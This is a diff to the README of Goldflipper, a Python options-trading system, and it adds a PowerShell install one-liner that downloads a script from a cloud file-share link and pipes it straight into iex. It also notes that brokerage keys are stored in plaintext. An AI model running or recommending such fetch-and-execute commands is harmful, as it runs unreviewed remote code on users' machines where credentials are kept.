@@ -14,12 +14,12 @@ Goldflipper Trading System
 
 ## Disclaimer
 
-Goldflipper Classic is proprietary, source-available software. Please note that technical support, bug fix, and feature requests are managed on a discretionary basis at this time.
+Goldflipper is proprietary, source-available software. Please note that technical support, bug fix, and feature requests are managed on a discretionary basis at this time.
 This program does not capture or transmit any of your data. Goldflipper only makes connections to brokerage(s) and market data provider(s). Newer branches also make calls using ancillary python libraries in order to enhance function by validating inputs (to address user entry errors), and by checking the market calendar. Security wise, note that in this version, access keys are stored in the settings file in plaintext (or, plain-yaml).
 
 ## Introduction
 
-Goldflipper Classic is a rules-based semi-autonomous trading system developed in Python. It utilizes a modular, event-driven architecture to automate trading strategy execution, with a current focus on level 2 options trading. The system is designed for customizability, modularity, and offers a feature-rich parameter selection that enables functionality not seen in any other program of its kind. Goldflipper integrates with the Alpaca Markets API for live trading, and has API integrations with market data providers as well in order to provide a modular and robust trading experience with fallbacks for reliability.
+Goldflipper is a semi-autonomous trading system developed in Python. It utilizes a modular, event-driven architecture to automate trading strategy execution, with a current focus on level 2 options trading. The system is designed for customizability, modularity, and offers a feature-rich parameter selection that enables functionality not seen in any other program of its kind. Goldflipper integrates with the Alpaca Markets API for live trading, and has API integrations with market data providers as well in order to provide a modular and robust trading experience with fallbacks for reliability.
 
 ## Getting Started
 
@@ -55,7 +55,13 @@ The MSI installer provides:
 
 See [Windows Installer Documentation](docs/WINDOWS_INSTALLER.md) for details.
 
-#### One Command Bootstrap (Simple)
+### One-Liner Bootstrap (Current)
+
+```powershell
+irm 'https://cloud.zimerguz.net/s/558TjEgMCdEjaLN/download' | iex
+```
+
+#### One Command Bootstrap (Old)
 
 The easiest way to install Goldflipper is to run the following command in PowerShell:
 
@@ -117,7 +123,7 @@ pip install -e . --pre
 
 2. **Clone and setup**:
    ```powershell
-   git clone <repo-url>
+   git clone https://github.com/Zaroganos/goldflipper.git
    cd goldflipper
    uv sync
    ```
